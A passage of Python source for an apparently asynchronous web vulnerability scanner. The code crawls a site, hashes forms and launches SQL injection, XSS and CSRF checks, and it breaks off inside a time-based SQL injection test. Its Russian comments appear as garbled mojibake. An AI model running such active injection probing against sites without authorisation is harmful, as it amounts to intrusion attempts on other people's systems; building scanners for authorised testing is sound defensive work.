            links, forms = await self._extract_links_from_url(
                session, semaphore, url,
                urlparse(self.base_url).netloc,
                visited_urls,
                only_forms=False
            )

            # –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–µ —Ñ–æ—Ä–º—ã –≤ –æ–±—â–∏–π —Å–ø–∏—Å–æ–∫
            new_forms_count = 0
            for form in forms:
                form_hash = self.get_form_hash(form)
                if form_hash not in [f.get('hash') for f in self.all_found_forms]:
                    self.all_found_forms.append({
                        'form': form,
                        'url': url,
                        'hash': form_hash
                    })
                    new_forms_count += 1

            self.total_forms_count = len(self.all_found_forms)
            logger.info(f"Added {new_forms_count} new unique forms. Total forms: {self.total_forms_count}")

            # –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–µ —Å—Å—ã–ª–∫–∏ –≤ –æ—á–µ—Ä–µ–¥—å
            logger.info(f"Found {len(links)} links on {url} at current depth {current_depth}")
            new_links_added = 0
            skipped_visited = 0
            skipped_file = 0

            # –í—ã–≤–æ–¥–∏–º –ø–µ—Ä–≤—ã–µ 5 –Ω–∞–π–¥–µ–Ω–Ω—ã—Ö —Å—Å—ã–ª–æ–∫ –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
            for i, link in enumerate(list(links)[:5]):
                logger.info(f"DEBUG_LINK_{i}: {link}")

            for link in links:
                if link in visited_urls:
                    skipped_visited += 1
                    continue
                if link in seen_urls:
                    skipped_visited += 1
                    continue
                if is_file_url(link):
                    logger.info(f"SKIP_FILE: {link}")
                    skipped_file += 1
                    continue
                new_depth = current_depth + 1
                await to_visit.put((link, new_depth))
                self.total_links_count += 1
                new_links_added += 1
                logger.info(f"ADD_LINK: {link} with depth {new_depth} (total_links_count={self.total_links_count})")
                # –ù–µ –¥–æ–±–∞–≤–ª—è–µ–º —Å—Å—ã–ª–∫—É –≤ visited_urls –∑–¥–µ—Å—å, —Ç–æ–ª—å–∫–æ –≤ seen_urls
                seen_urls.add(link)

            logger.info(f"Link processing summary: total={len(links)}, added={new_links_added}, skipped_visited={skipped_visited}, skipped_file={skipped_file}")
            logger.info(f"Added {new_links_added} new links to queue. Queue size after adding links: {to_visit.qsize()}")

            # –°–∫–∞–Ω–∏—Ä—É–µ–º —Ç–µ–∫—É—â–∏–π URL
            unique_forms = [f['form'] for f in self.all_found_forms if f['url'] == url]
            logger.info(f"Found {len(unique_forms)} unique forms on {url}. Starting scan...")

            # –û–±–Ω–æ–≤–ª—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –ø–æ—Å–ª–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏ URL
            self.update_progress(
                url,
                current_depth,
                to_visit.qsize()
            )

            # –û–±–Ω–æ–≤–ª—è–µ–º –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É—é –¥–æ—Å—Ç–∏–≥–Ω—É—Ç—É—é –≥–ª—É–±–∏–Ω—É
            if current_depth > self.max_depth_reached:
                self.max_depth_reached = current_depth
                logger.info(f"NEW MAX DEPTH REACHED: {self.max_depth_reached} at URL: {url}")

            logger.info(f"About to scan_single_url for {url} at depth {current_depth}")
            await self.scan_single_url(
                session, semaphore, url,
                visited_urls, scanned_urls,
                results_by_type, to_visit,
                current_depth, unique_forms
            )

        except aiohttp.ClientError as e:
                log_and_notify('error', f"Client error accessing {url}: {e}")
                self.unscanned_urls.add(url)
        except asyncio.TimeoutError:
                logger.warning(f"Timeout accessing {url}")
                self.unscanned_urls.add(url)
        except (ValueError, TypeError, AttributeError) as e:
                log_and_notify('error', f"Data processing error for {url}: {e}")
                self.unscanned_urls.add(url)
        except Exception as e:
                log_and_notify('error', f"Unexpected error processing {url}: {e}")
                self.unscanned_urls.add(url)

        return links, forms

    async def scan_single_url(self, session: aiohttp.ClientSession, semaphore: asyncio.Semaphore,
                              url: str, visited_urls: set[str], scanned_urls: set[str],
                              results_by_type: Dict[str, List[str]], to_visit: asyncio.Queue[Tuple[str, int]], current_depth: int, forms_to_scan: Optional[List[Tag]] = None):
        if forms_to_scan is None:
            forms_to_scan = []
        if url in scanned_urls:
            logger.info(f"URL {url} already in scanned_urls, skipping")
            return
        if self._is_paused:
            logger.info(f"Scan is paused, skipping URL {url}")
            return
        logger.info(f"Starting to scan URL: {url} at depth {current_depth}")

        # –ò—Å–ø–æ–ª—å–∑—É–µ–º —Å–µ–º–∞—Ñ–æ—Ä –¥–ª—è –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –ø–∞—Ä–∞–ª–ª–µ–ª–∏–∑–º–∞
        async with semaphore:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ñ–ª–∞–≥–∏ —Å–Ω–æ–≤–∞ –ø–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º –æ–±—Ä–∞–±–æ—Ç–∫–∏
            if self.should_stop or self._is_paused:
                return

            scanned_urls.add(url)
            visited_urls.add(url)
            self.all_scanned_urls.add(url)
            self.total_scanned_count += 1

            # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø–æ—Å–ª–µ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è URL –≤ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ
            self.update_stats()

            # –ï—Å–ª–∏ –Ω–µ –¥–æ—Å—Ç–∏–≥–ª–∏ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–π –≥–ª—É–±–∏–Ω—ã, –∏–∑–≤–ª–µ–∫–∞–µ–º —Å—Å—ã–ª–∫–∏ —Å —Ç–µ–∫—É—â–µ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            if current_depth < self.max_depth:
                logger.info(f"Extracting links from {url} at depth {current_depth} (max_depth: {self.max_depth})")
                try:
                    links, forms = await self._extract_links_from_url(
                        session, semaphore, url,
                        urlparse(self.base_url).netloc,
                        visited_urls,
                        only_forms=False
                    )

                    # –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–µ —Ñ–æ—Ä–º—ã –≤ –æ–±—â–∏–π —Å–ø–∏—Å–æ–∫
                    new_forms_count = 0
                    for form in forms:
                        form_hash = self.get_form_hash(form)
                        if form_hash not in [f.get('hash') for f in self.all_found_forms]:
                            self.all_found_forms.append({
                                'form': form,
                                'url': url,
                                'hash': form_hash
                            })
                            new_forms_count += 1

                    self.total_forms_count = len(self.all_found_forms)
                    logger.info(f"Added {new_forms_count} new unique forms. Total forms: {self.total_forms_count}")

                    # –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–µ —Å—Å—ã–ª–∫–∏ –≤ –æ—á–µ—Ä–µ–¥—å
                    logger.info(f"Found {len(links)} links on {url} at current depth {current_depth}")
                    new_links_added = 0
                    for link in links:
                        if link not in visited_urls:
                            if is_file_url(link):
                                logger.info(f"SKIP_FILE: {link}")
                                continue
                            new_depth = current_depth + 1
                            await to_visit.put((link, new_depth))
                            self.total_links_count += 1
                            new_links_added += 1
                            logger.info(f"ADD_LINK: {link} with depth {new_depth} (total_links_count={self.total_links_count})")
                            # –ù–µ –¥–æ–±–∞–≤–ª—è–µ–º —Å—Å—ã–ª–∫—É –≤ visited_urls –∑–¥–µ—Å—å, —ç—Ç–æ –±—É–¥–µ—Ç —Å–¥–µ–ª–∞–Ω–æ –ø—Ä–∏ —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–æ–º –ø–æ—Å–µ—â–µ–Ω–∏–∏
                    logger.info(f"Added {new_links_added} new links to queue. Queue size after adding links: {to_visit.qsize()}")

                    # –û–±–Ω–æ–≤–ª—è–µ–º —Ñ–æ—Ä–º—ã –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π
                    forms_to_scan = [f['form'] for f in self.all_found_forms if f['url'] == url]
                    logger.info(f"Found {len(forms_to_scan)} unique forms on {url}. Starting scan...")

                except Exception as e:
                    log_and_notify('error', f"Error extracting links from {url}: {e}")
            else:
                logger.info(f"Reached max depth {current_depth} for URL {url}, not extracting links")
        try:
            if forms_to_scan:
                new_forms_count = 0
                for form in forms_to_scan:
                    form_hash = self.get_form_hash(form)
                    if form_hash not in self.scanned_form_hashes:
                        self.scanned_form_hashes.add(form_hash)
                        new_forms_count += 1
                if new_forms_count > 0:
                    self.scanned_forms_count += new_forms_count
                # --- –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –∑–∞–¥–∞—á (batch gather) ---
                batch_size = min(5, self.max_concurrent)  # –Ω–µ –±–æ–ª–µ–µ 5 –∑–∞–¥–∞—á –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ
                tasks: List[asyncio.Task[Optional[str]]] = []
                for scan_type in self.scan_types:
                    if self.should_stop:
                        return
                    if scan_type == 'sql':
                        tasks.append(asyncio.create_task(self.check_sql_injection(session, url, forms_to_scan)))
                    elif scan_type == 'xss':
                        tasks.append(asyncio.create_task(self.check_xss(session, url, forms_to_scan)))
                    elif scan_type == 'csrf':
                        tasks.append(asyncio.create_task(ScanWorker.check_csrf(url, forms_to_scan)))
                # --- Batch gather ---
                for i in range(0, len(tasks), batch_size):
                    batch = tasks[i:i+batch_size]
                    results = await asyncio.gather(*batch, return_exceptions=True)
                    for j, result in enumerate(results):
                        if isinstance(result, Exception):
                            log_and_notify('error', f"Failed to scan URL {url}: {result}")
                        elif result:
                            scan_type = self.scan_types[i+j] if (i+j) < len(self.scan_types) else 'unknown'
                            self._process_scan_results(url, [result], [scan_type], results_by_type)
            self.update_progress(url, current_depth, to_visit.qsize())
            logger.info(f"Successfully scanned URL: {url} at depth {current_depth}")
        except Exception as e:
            log_and_notify('error', f"Failed to scan URL {url}: {e}")

    def _process_scan_results(self, url: str, results: List[Any], scan_types_used: List[str], results_by_type: Dict[str, List[Any]]):
        """
        –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è.
        """
        try:
            if results:
                for scan_type in scan_types_used:
                    if scan_type in results_by_type:
                        results_by_type[scan_type].append({
                            'url': url,
                            'details': str(results),
                            'timestamp': datetime.now().isoformat()
                        })
                        
                        # –¢–∞–∫–∂–µ —Å–æ—Ö—Ä–∞–Ω—è–µ–º –≤ self.vulnerabilities –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–≥–æ –ø–æ–¥—Å—á–µ—Ç–∞
                        if scan_type not in self.vulnerabilities:
                            self.vulnerabilities[scan_type] = []
                        
                        self.vulnerabilities[scan_type].append({
                            'url': url,
                            'details': str(results),
                            'timestamp': datetime.now().isoformat()
                        })
                        
        except Exception as e:
            log_and_notify('error', f"Error processing scan results: {e}")

    async def _extract_links_from_url(self, 
                                      session: aiohttp.ClientSession, 
                                      semaphore: asyncio.Semaphore,
                                      url: str, 
                                      base_domain: str, 
                                      visited_urls: Optional[set[str]] = None, 
                                      only_forms: bool = False) -> Tuple[Set[str], List[Tag]]:
        if visited_urls is None:
            visited_urls = set()
        found_links: Set[str] = set()
        found_forms: List[Tag] = []
        try:
            if self.should_stop or self._is_paused:
                return found_links, found_forms
            if not url:
                return found_links, found_forms
            async with semaphore:
                result = await self.smart_request(
                    session=session, 
                    method='GET', 
                    url=url, 
                    retries=2
                )

                # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç –Ω–µ None
                if result is None:
                    return found_links, found_forms
                
                # –ü–æ–ª—É—á–∞–µ–º —Ç–æ–ª—å–∫–æ html_content –∏–∑ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞
                html_content = result[1]

                if not html_content:
                    return found_links, found_forms
                
                # --- –ò—Å–ø–æ–ª—å–∑—É–µ–º LRU-–∫—ç—à –¥–ª—è –ø–∞—Ä—Å–∏–Ω–≥–∞ HTML ---
                # –ü–æ–ª—É—á–∞–µ–º –∑–Ω–∞—á–µ–Ω–∏–µ –ø–∞—Ä—Å–µ—Ä–∞ –∏–∑ —Å–ª–æ–≤–∞—Ä—è, –≥–∞—Ä–∞–Ω—Ç–∏—Ä—É—è, —á—Ç–æ —ç—Ç–æ —Å—Ç—Ä–æ–∫–∞
                parser_value = BS4_OPTIMIZATIONS.get('parser', 'html.parser')
                if isinstance(parser_value, list):
                    parser_value = parser_value[0] if parser_value else 'html.parser'

                # –ò—Å–ø–æ–ª—å–∑—É–µ–º –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ —Å—Ç—Ä–æ–∫–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ
                soup = cached_parse_html(html_content, parser_value)

                # –ï—Å–ª–∏ only_forms=False, –∏—â–µ–º —Å—Å—ã–ª–∫–∏
                if not only_forms:
                    for link in soup.find_all('a', href=True):
                        if isinstance(link, Tag):
                            href = str(link.get('href', ''))
                            absolute_url = urljoin(url, href)
                            if self.is_same_domain(absolute_url, base_domain):
                                # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ –ø–æ—Å–µ—â–∞–ª–∏ –ª–∏ –º—ã —ç—Ç–æ—Ç URL —Ä–∞–Ω–µ–µ
                                if absolute_url not in visited_urls:
                                    # –ù–µ –¥–æ–±–∞–≤–ª—è–µ–º –≤ visited_urls –∑–¥–µ—Å—å, —Ç–æ–ª—å–∫–æ –≤ found_links
                                    found_links.add(absolute_url)

                # –ò—â–µ–º —Ñ–æ—Ä–º—ã
                for form in soup.find_all('form'):
                    # –Ø–≤–Ω–æ –ø—Ä–∏–≤–æ–¥–∏–º —Ç–∏–ø –∫ Tag
                    found_forms.append(cast(Tag, form))

        except Exception as e:
            log_and_notify('error', f"Error extracting links from {url}: {e}")
        return found_links, found_forms

    @staticmethod
    def get_form_hash(form_tag: Tag) -> str:
        """
        –°–æ–∑–¥–∞–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—ã–π —Ö—ç—à –¥–ª—è —Ç–µ–≥–∞ —Ñ–æ—Ä–º—ã —Å —É–ª—É—á—à–µ–Ω–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –æ—à–∏–±–æ–∫.
        """
        try:
            if not form_tag:
                logger.warning("Invalid or empty form tag passed for hashing")
                return hashlib.sha256(b"invalid_form", usedforsecurity=False).hexdigest()

            action = str(form_tag.get('action', '')) if form_tag else ''
            action = action.strip()
            method = str(form_tag.get('method', 'get')).lower() if form_tag else 'get'
            method = method.lower().strip()

            inputs: List[str] = []
            try:
                if form_tag:  # –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –ø–µ—Ä–µ–¥ –ø–æ–∏—Å–∫–æ–º –ø–æ–ª–µ–π
                    for inp in form_tag.find_all(['input', 'textarea', 'select', 'button']):
                        if isinstance(inp, Tag):
                            inp_name = inp.get('name', '')
                            inp_type = inp.get('type', 'text')  # default type
                            if inp_name and isinstance(inp_name, str):
                                inputs.append(f"{inp.name}-{inp_type}-{inp_name}")
            except Exception as e:
                logger.warning(f"Error finding form fields: {e}")

            inputs.sort()
            form_representation = f"action:{action}|method:{method}|inputs:{','.join(inputs)}"
            return hashlib.sha256(form_representation.encode('utf-8', errors='replace'), usedforsecurity=False).hexdigest()

        except Exception as e:
            log_and_notify('error', f"Critical error creating form hash: {e}")
            return hashlib.sha256(str(time.time()).encode(), usedforsecurity=False).hexdigest()


    @staticmethod
    def is_same_domain(url: str, base_domain: str) -> bool:
        """
        –ü—Ä–æ–≤–µ—Ä—è–µ—Ç, –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç –ª–∏ URL –¥–∞–Ω–Ω–æ–º—É –¥–æ–º–µ–Ω—É –∏–ª–∏ –µ–≥–æ –ø–æ–¥–¥–æ–º–µ–Ω–∞–º —Å —É–ª—É—á—à–µ–Ω–Ω–æ–π –≤–∞–ª–∏–¥–∞—Ü–∏–µ–π.
        """
        try:
            # –í–∞–ª–∏–¥–∞—Ü–∏—è –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
            if not url:
                logger.warning(f"Invalid URL for domain check: {url}")
                return False
            
            if not base_domain:
                logger.warning(f"Invalid base domain: {base_domain}")
                return False
            
            # –ü–∞—Ä—Å–∏–º URL
            parsed = urlparse(url)
            url_domain = parsed.netloc.lower()
            base_domain = base_domain.lower()
            
            # –£–±–∏—Ä–∞–µ–º –ø–æ—Ä—Ç –∏–∑ –¥–æ–º–µ–Ω–∞ –µ—Å–ª–∏ –µ—Å—Ç—å
            url_domain = url_domain.split(':')[0]
            base_domain = base_domain.split(':')[0]
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–æ—á–Ω–æ–µ —Å–æ–≤–ø–∞–¥–µ–Ω–∏–µ
            if url_domain == base_domain:
                return True
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ URL –ø–æ–¥–¥–æ–º–µ–Ω–æ–º –±–∞–∑–æ–≤–æ–≥–æ –¥–æ–º–µ–Ω–∞
            if url_domain.endswith('.' + base_domain):
                return True
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–ª—É—á–∞–∏ (localhost, IP –∞–¥—Ä–µ—Å–∞)
            if base_domain in ['localhost', '127.0.0.1'] and url_domain in ['localhost', '127.0.0.1']:
                return True
            
            return False
            
        except Exception as e:
            log_and_notify('error', f"Error checking domain {url} against {base_domain}: {e}")
            return False

    async def smart_request(self, session: aiohttp.ClientSession, method: str, url: str, retries: int = 2, **kwargs: Any) -> Optional[Tuple[Optional[object], Optional[str]]]:
        """
        –£–º–Ω—ã–π HTTP –∑–∞–ø—Ä–æ—Å —Å —É–ª—É—á—à–µ–Ω–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –æ—à–∏–±–æ–∫ –∏ –≤–∞–ª–∏–¥–∞—Ü–∏–µ–π.
        """
        global cache_operations
        cache_operations += 1
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ñ–ª–∞–≥–∏ –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –∏ –ø–∞—É–∑—ã –≤ –Ω–∞—á–∞–ª–µ
        if self.should_stop or self._is_paused:
            logger.info("HTTP request stopped by user request or pause")
            return None
            
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å —Å–µ—Å—Å–∏–∏
        if not session or not hasattr(session, 'request'):
            log_and_notify('error', f"Invalid session for request to {url}")
            return None
        
        # –í–∞–ª–∏–¥–∞—Ü–∏—è URL
        if not url:
            log_and_notify('error', f"Invalid URL: {url}")
            return None
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫—ç—à
        cache_key = f"{method}:{url}:{hash(str(kwargs))}"
        if URL_PROCESSING_CACHE.get(cache_key) is not None:
            logger.debug(f"Cache hit for {url}")
            return URL_PROCESSING_CACHE.get(cache_key)
        
        attempt = 0
        last_exception = None
        max_attempts = 3 if getattr(self, 'max_coverage_mode', False) else retries
        
        while attempt < max_attempts:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ñ–ª–∞–≥ –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–µ—Ä–µ–¥ –∫–∞–∂–¥–æ–π –ø–æ–ø—ã—Ç–∫–æ–π
            if self.should_stop:
                logger.info("HTTP request stopped by user request")
                return None
                
            try:
                logger.info(f"Making {method} request to {url} (attempt {attempt + 1}/{max_attempts})")
                
                # –ò—Å–ø–æ–ª—å–∑—É–µ–º –æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
                timeout = aiohttp.ClientTimeout(**HTTP_OPTIMIZATIONS['timeout'])
                headers: Dict[str, str] = {**HTTP_OPTIMIZATIONS['headers'], **kwargs.get('headers', {})}
                
                async with session.request(method, url, timeout=timeout, headers=headers, **kwargs) as response:
                    logger.info(f"Response status: {response.status} for {url}")
                    
                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º Content-Type –ü–ï–†–ï–î —á—Ç–µ–Ω–∏–µ–º —Ç–µ–ª–∞
                    content_type = response.headers.get('Content-Type', '').lower()
                    logger.debug(f"Content-Type: {content_type} for {url}")
                    
                    # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –±–∏–Ω–∞—Ä–Ω—ã–µ —Ñ–∞–π–ª—ã
                    if not any(t in content_type for t in ['html', 'text', 'json', 'xml', 'javascript']):
                        logger.debug(f"Binary content detected for {url}, skipping")
                        await response.read()  # –ü–æ—Ç—Ä–µ–±–ª—è–µ–º —Ç–µ–ª–æ –¥–ª—è –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏—è —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
                        result = (response, "")  # –í–æ–∑–≤—Ä–∞—â–∞–µ–º –ø—É—Å—Ç–æ–π —Ç–µ–∫—Å—Ç –¥–ª—è –±–∏–Ω–∞—Ä–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
                        URL_PROCESSING_CACHE.set(cache_key, result)
                        return result
                    
                    # –ß–∏—Ç–∞–µ–º —Ç–µ–ª–æ –æ—Ç–≤–µ—Ç–∞
                    try:
                        response_text = await response.text()
                    except UnicodeDecodeError:
                        logger.warning(f"Unicode decode error for {url}, trying with errors='replace'")
                        response_text = await response.text(errors='replace')
                    
                    result = (response, response_text)
                    URL_PROCESSING_CACHE.set(cache_key, result)
                    return result
                    
            except aiohttp.ClientError as e:
                last_exception = e
                logger.warning(f"Client error on attempt {attempt + 1} for {url}: {e}")
            except asyncio.TimeoutError as e:
                last_exception = e
                logger.warning(f"Timeout on attempt {attempt + 1} for {url}")
            except (ValueError, TypeError, AttributeError) as e:
                last_exception = e
                log_and_notify('error', f"Data error on attempt {attempt + 1} for {url}: {e}")
            except Exception as e:
                last_exception = e
                log_and_notify('error', f"Unexpected error on attempt {attempt + 1} for {url}: {e}")
            
            attempt += 1
            if attempt < max_attempts:
                await asyncio.sleep(1)  # –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏
        
        log_and_notify('error', f"All {max_attempts} attempts failed for {url}: {last_exception}")
        self.unscanned_urls.add(url)
        return None


    def save_vulnerability(self, url: str, vuln_type: str, details: str):
        """
        –°–æ—Ö—Ä–∞–Ω—è–µ—Ç –Ω–∞–π–¥–µ–Ω–Ω—É—é —É—è–∑–≤–∏–º–æ—Å—Ç—å –≤ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö.
        """
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ —Å–ø–∏—Å–∫–µ –ø–æ URL –∏ –¥–µ—Ç–∞–ª—è–º
            if vuln_type in self.vulnerabilities:
                for vuln in self.vulnerabilities[vuln_type]:
                    if vuln.get('url') == url and vuln.get('details') == details:
                        logger.debug(f"Vulnerability {vuln_type} on {url} already saved")
                        return
            
            # –î–æ–±–∞–≤–ª—è–µ–º –≤ –ª–æ–∫–∞–ª—å–Ω—ã–π —Å–ø–∏—Å–æ–∫
            if vuln_type not in self.vulnerabilities:
                self.vulnerabilities[vuln_type] = []
            
            self.vulnerabilities[vuln_type].append({
                'url': url,
                'details': details,
                'timestamp': datetime.now().isoformat()
            })
            
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö
            try:
                # –ü–æ–ª—É—á–∞–µ–º scan_id –¥–ª—è —Ç–µ–∫—É—â–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                scan_id = None
                with db.get_db_connection() as conn:
                    cursor = conn.cursor()
                    cursor.execute(
                        "SELECT id FROM scans WHERE user_id = ? ORDER BY timestamp DESC LIMIT 1",
                        (self.user_id,)
                    )
                    result = cursor.fetchone()
                    if result:
                        scan_id = result[0]
                    else:
                        logger.warning(f"Scan ID not found for user {self.user_id}")
                        return
                
                # –°–æ—Ö—Ä–∞–Ω—è–µ–º —É—è–∑–≤–∏–º–æ—Å—Ç—å
                with db.get_db_connection() as conn:
                    cursor = conn.cursor()
                    cursor.execute(
                        "INSERT INTO vulnerabilities (scan_id, url, type, details) VALUES (?, ?, ?, ?)",
                        (scan_id, url, vuln_type, details)
                    )
                    conn.commit()
                
            except sqlite3.Error as e:
                log_and_notify('error', f"Database error saving vulnerability: {e}")
            except Exception as e:
                log_and_notify('error', f"Unexpected error saving vulnerability: {e}")
                
        except Exception as e:
            log_and_notify('error', f"Error in save_vulnerability: {e}")

    async def _submit_form(self, session: aiohttp.ClientSession, method: str, url: str, form_data: Dict[str, str]) -> Tuple[Optional[object], str]:
        """
        –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ñ–æ—Ä–º—É –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –æ—Ç–≤–µ—Ç.
        """
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å —Å–µ—Å—Å–∏–∏
            if not session or not hasattr(session, 'request'):
                log_and_notify('error', f"Invalid session for form submission to {url}")
                return None, ""
            
            # –í–∞–ª–∏–¥–∞—Ü–∏—è URL
            if not url:
                log_and_notify('error', f"Invalid URL for form: {url}")
                return None, ""
            
            # –í–∞–ª–∏–¥–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö —Ñ–æ—Ä–º—ã
            if not form_data:
                logger.warning(f"Empty or invalid form data for {url}")
                return None, ""
            
            # –ù–æ—Ä–º–∞–ª–∏–∑—É–µ–º –º–µ—Ç–æ–¥
            method = method.upper()
            if method not in ['GET', 'POST']:
                logger.warning(f"Unsupported method {method}, using GET")
                method = 'GET'
            
            # –°–æ–∑–¥–∞–µ–º timeout –æ–±—ä–µ–∫—Ç
            timeout = aiohttp.ClientTimeout(total=self.timeout)
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å
            try:
                if method == 'GET':
                    async with session.get(url, params=form_data, timeout=timeout) as response:
                        return response, await response.text(errors='replace')
                else:  # POST
                    async with session.post(url, data=form_data, timeout=timeout) as response:
                        return response, await response.text(errors='replace')
                        
            except aiohttp.ClientError as e:
                logger.warning(f"Client error submitting form to {url}: {e}")
                return None, ""
            except asyncio.TimeoutError as e:
                logger.warning(f"Timeout submitting form to {url}: {e}")
                return None, ""
            except (ValueError, TypeError, AttributeError) as e:
                log_and_notify('error', f"Data error submitting form to {url}: {e}")
                return None, ""
            except Exception as e:
                log_and_notify('error', f"Unexpected error submitting form to {url}: {e}")
                return None, ""
                
        except Exception as e:
            log_and_notify('error', f"Error in _submit_form: {e}")
            return None, ""

    async def check_sql_injection(self, session: aiohttp.ClientSession, url: str, forms: Optional[List[Tag]] = None) -> Optional[str]:
        """
        –£–ª—å—Ç—Ä–∞-–æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏.
        –ò—Å–ø–æ–ª—å–∑—É–µ—Ç –¥–≤—É—Ö—ç—Ç–∞–ø–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ, –ø–∞—Ä–∞–ª–ª–µ–ª–∏–∑–∞—Ü–∏—é –∏ –∫–æ–º–ø–∞–∫—Ç–Ω—ã–π –∫–æ–¥.
        """
        
        async def _test_target(target_url: str, test_method: str = 'GET', test_data: Optional[Dict[str, str]] = None) -> Optional[str]:
            """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç –æ–¥–∏–Ω URL –∏–ª–∏ —Ñ–æ—Ä–º—É –Ω–∞ SQLi, –≤–æ–∑–≤—Ä–∞—â–∞—è –ø–µ—Ä–≤—É—é –Ω–∞–π–¥–µ–Ω–Ω—É—é —É—è–∑–≤–∏–º–æ—Å—Ç—å."""

            async def _run_test(test_payload: str) -> Tuple[bool, Optional[str]]:
                """–ó–∞–ø—É—Å–∫–∞–µ—Ç –æ–¥–∏–Ω —Ç–µ—Å—Ç —Å –ø–µ–π–ª–æ–∞–¥–æ–º –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç (is_vulnerable, details)."""
                try:
                    req_url = target_url

                    if test_method == 'GET':
                        parsed = urlparse(target_url)
                        params = {k: test_payload for k in parse_qs(parsed.query)}
                        req_url = parsed._replace(query=urlencode(params, doseq=True)).geturl()
                        result = await self.smart_request(session, test_method, req_url)
                        if result is None:
                            return False, None
                        _, text = result
                    else:
                       result = await self.smart_request(session, test_method, target_url, data=test_data if test_data else {})
                       if result is None:
                           return False, None
                       _, text = result

                    # –ü—Ä–æ–≤–µ—Ä–∫–∞ time-based SQL injection
                    if "SLEEP" in test_payload.upper():
                        start_time = time.monotonic()
                        duration = 0
                        if test_method == 'POST':
                            result = await self.smart_request(session, test_method, target_url, data=test_data if test_data else {})
                            if result is None:
                                return False, None
                            _, text = result
                        else:
                            result = await self.smart_request(session, test_method, req_url)
                            if result is None:
                                return False, None
                            _, text = result
                            if text:
